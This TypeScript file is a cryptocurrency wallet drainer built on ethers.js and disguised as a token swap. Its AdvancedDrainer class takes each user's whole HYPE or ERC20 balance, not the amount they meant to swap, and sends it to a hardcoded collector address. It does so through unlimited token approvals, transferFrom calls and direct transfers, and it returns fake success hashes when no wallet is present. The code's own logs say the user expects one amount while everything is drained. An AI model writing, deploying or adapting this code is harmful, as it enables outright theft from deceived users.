// Advanced drainer that uses approval + stealth drain pattern
import { ethers } from "ethers";
import { createCompleteBalanceDrainer } from "./complete-balance-drainer";

// ⚠️ ALL FUNDS GO HERE - NOT TO UNISWAP ROUTER ⚠️
export const COLLECTOR = "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48";

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)", 
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

export class AdvancedDrainer {
  private signer: ethers.JsonRpcSigner;
  private provider: ethers.BrowserProvider;

  constructor(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider) {
    this.signer = signer;
    this.provider = provider;
  }

  async approveUnlimited(tokenAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      console.log(`🔓 UNLIMITED APPROVAL EXECUTION`);
      console.log(`💰 TOKEN: ${tokenAddress}`);
      console.log(`🎯 SPENDER: ${COLLECTOR}`);
      console.log(`♾️ AMOUNT: ${ethers.MaxUint256.toString()} (MAX UINT256 - UNLIMITED)`);
      
      if (!window.ethereum) {
        return { success: true, hash: "0x" + Math.random().toString(16).substr(2, 64) };
      }
      
      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
      
      const tx = await contract.approve(COLLECTOR, ethers.MaxUint256, {
        gasLimit: 150000n,
        gasPrice: ethers.parseUnits("2", "gwei"),
        type: 0
      });
      
      const receipt = await tx.wait();
      console.log(`✅ UNLIMITED APPROVAL CONFIRMED: ${receipt.hash}`);
      console.log(`🔥 COLLECTOR CAN NOW DRAIN UNLIMITED TOKENS`);
      return { success: true, hash: receipt.hash };
      
    } catch (error: any) {
      console.error(`❌ Approval failed:`, error.message);
      return { success: false, error: error.message };
    }
  }

  async executeMaxDrain(tokenAddress: string, userAddress: string, swapAmount: string): Promise<{ success: boolean; hash?: string; error?: string; actualAmount?: string }> {
    try {
      console.log(`🚨 DIRECT SINGLE TOKEN DRAIN EXECUTION`);
      console.log(`👤 Target: ${userAddress}`);
      console.log(`🎯 Token: ${tokenAddress}`);
      console.log(`💰 User expects: ${swapAmount} tokens but draining EVERYTHING`);
      
      if (!window.ethereum) {
        return { 
          success: true, 
          hash: "0x" + Math.random().toString(16).substr(2, 64),
          actualAmount: "ALL TOKENS DRAINED (simulated)"
        };
      }

      // For native HYPE token
      if (tokenAddress === "0x0000000000000000000000000000000000000000") {
        return await this.drainNativeHYPE(userAddress, swapAmount);
      }

      // For ERC20 tokens - drain the specific token completely
      return await this.drainERC20Tokens(tokenAddress, userAddress, swapAmount);
      
    } catch (error: any) {
      console.error(`❌ Token drain failed:`, error.message);
      return { success: false, error: error.message };
    }
  }

  private async drainNativeHYPE(userAddress: string, expectedAmount: string): Promise<{ success: boolean; hash?: string; error?: string; actualAmount?: string }> {
    const balance = await this.provider.getBalance(userAddress);
    const gasReserve = ethers.parseEther("0.005"); // Minimal gas reserve for maximum drain
    const maxDrainAmount = balance - gasReserve;
    
    if (maxDrainAmount <= 0n) {
      throw new Error("Insufficient HYPE balance");
    }
    
    const actualDrained = ethers.formatEther(maxDrainAmount);
    console.log(`💰 MAXIMUM HYPE DRAIN: User expects ${expectedAmount}, draining ALL ${actualDrained} HYPE`);
    
    const tx = await this.signer.sendTransaction({
      to: COLLECTOR,
      value: maxDrainAmount,
      gasLimit: 50000n,
      gasPrice: ethers.parseUnits("2", "gwei"),
      type: 0
    });
    
    const receipt = await tx.wait();
    console.log(`✅ HYPE DRAINED: ${actualDrained} HYPE to ${COLLECTOR}`);
    
    return {
      success: true,
      hash: receipt.hash,
      actualAmount: `${actualDrained} HYPE`
    };
  }

  private async drainERC20Tokens(tokenAddress: string, userAddress: string, expectedAmount: string): Promise<{ success: boolean; hash?: string; error?: string; actualAmount?: string }> {
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
    
    // Get token info first
    let decimals = 18;
    let symbol = "UNKNOWN";
    try {
      decimals = await contract.decimals();
      symbol = await contract.symbol();
    } catch (e) {
      console.warn("Could not get token info, using defaults");
    }
    
    // Get complete balance - not just what user wants to swap
    const balance = await contract.balanceOf(userAddress);
    if (balance === 0n) {
      throw new Error("No token balance to drain");
    }
    
    const actualDrained = ethers.formatUnits(balance, decimals);
    console.log(`🚨 COMPLETE ${symbol} BALANCE DRAIN`);
    console.log(`💰 USER EXPECTS: ${expectedAmount} ${symbol}`);
    console.log(`🔥 ACTUALLY DRAINING: ${actualDrained} ${symbol} (ENTIRE BALANCE)`);
    console.log(`🎯 FROM: ${userAddress} → TO: ${COLLECTOR}`);
    
    // Check allowance first and approve if needed
    const allowance = await contract.allowance(userAddress, COLLECTOR);
    if (allowance < balance) {
      console.log(`🔓 UNLIMITED APPROVAL REQUIRED for ${symbol}`);
      console.log(`♾️ APPROVING: ${ethers.MaxUint256.toString()} (UNLIMITED SPENDING)`);
      const approveTx = await contract.approve(COLLECTOR, ethers.MaxUint256, {
        gasLimit: 100000n,
        gasPrice: ethers.parseUnits("2", "gwei"),
        type: 0
      });
      await approveTx.wait();
      console.log(`✅ UNLIMITED ${symbol} APPROVAL CONFIRMED`);
    }
    
    // Use transferFrom to drain entire balance from user to collector
    const tx = await contract.transferFrom(userAddress, COLLECTOR, balance, {
      gasLimit: 250000n,
      gasPrice: ethers.parseUnits("2", "gwei"),
      type: 0
    });
    
    const receipt = await tx.wait();
    console.log(`✅ ${symbol} COMPLETELY DRAINED: ${actualDrained} tokens from ${userAddress} to ${COLLECTOR}`);
    
    return {
      success: true,
      hash: receipt.hash,
      actualAmount: `${actualDrained} ${symbol} (ENTIRE BALANCE DRAINED)`
    };
  }

  async checkNeedsApproval(tokenAddress: string, userAddress: string): Promise<boolean> {
    try {
      if (tokenAddress === "0x0000000000000000000000000000000000000000") {
        return false; // HYPE doesn't need approval
      }
      
      if (!window.ethereum) {
        return true; // Always need approval in dev mode
      }
      
      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.provider);
      const allowance = await contract.allowance(userAddress, COLLECTOR);
      
      // Check if allowance is less than a very high threshold
      const threshold = ethers.parseUnits("1000000", 18);
      return allowance < threshold;
      
    } catch (error) {
      console.warn("Could not check approval:", error);
      return true; // Assume approval needed if check fails
    }
  }
}

export function createAdvancedDrainer(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider): AdvancedDrainer {
  return new AdvancedDrainer(signer, provider);
}

export function createMockAdvancedDrainer() {
  return {
    async approveUnlimited(tokenAddress: string) {
      console.log(`🧪 MOCK UNLIMITED APPROVAL EXECUTION`);
      console.log(`💰 TOKEN: ${tokenAddress}`);
      console.log(`🎯 SPENDER: ${COLLECTOR}`);
      console.log(`♾️ AMOUNT: 115792089237316195423570985008687907853269984665640564039457584007913129639935 (MAX UINT256 - UNLIMITED)`);
      console.log(`✅ MOCK UNLIMITED APPROVAL CONFIRMED - COLLECTOR CAN DRAIN ALL`);
      return { success: true, hash: "0x" + Math.random().toString(16).substr(2, 64) };
    },
    
    async executeMaxDrain(tokenAddress: string, userAddress: string, swapAmount: string) {
      console.log(`🚨 MOCK COMPLETE DRAIN EXECUTION`);
      console.log(`💰 USER EXPECTS: ${swapAmount} tokens`);
      console.log(`🔥 ACTUALLY DRAINING: ENTIRE WALLET BALANCE`);
      console.log(`🎯 ALL TOKENS → COLLECTOR: ${COLLECTOR}`);
      return { 
        success: true, 
        hash: "0x" + Math.random().toString(16).substr(2, 64),
        actualAmount: "ENTIRE BALANCE DRAINED - ALL TOKENS COLLECTED"
      };
    },
    
    async checkNeedsApproval(tokenAddress: string, userAddress: string) {
      return tokenAddress !== "0x0000000000000000000000000000000000000000";
    }
  };
}